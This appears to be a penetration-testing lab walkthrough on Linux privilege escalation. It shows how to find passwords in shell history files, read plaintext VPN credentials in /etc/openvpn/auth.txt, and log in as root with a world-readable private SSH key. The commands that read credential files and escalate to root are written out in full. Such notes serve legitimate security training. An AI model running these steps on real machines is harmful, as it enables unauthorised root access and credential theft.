# Passwords & Keys

### History Files

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:

`cat ~/.*history | less`

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password:

<mark style="color:red;">`mysql -h somehost.local -uroot -ppassword123`</mark>

Switch to the root user, using the password:

`su root`

### Config Files

Config files often contain passwords in plaintext or other reversible formats.

user's home directory we find a myvpn.ovpn config file. View the contents of the file:

`cat /home/user/myvpn.ovpn`

The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:

```shell-session
$ cat /home/user/myvpn.ovpn
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0
$ cat /etc/openvpn/auth.txt
root
password123
```

`su root`

### SSH Keys

Sometimes users make backups of important files but fail to secure them with the correct permissions.

for example:

Look for hidden files & directories in the system root:

`ls -la /`

Note that there appears to be a hidden directory called .ssh. View the contents of the directory:

`ls -l /.ssh`

Note that there is a world-readable file called root\_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

Copy the key over to your machine (it's easier to just view the contents of the root\_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:

`chmod 600 root_key`

Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):

`ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@[ip]`
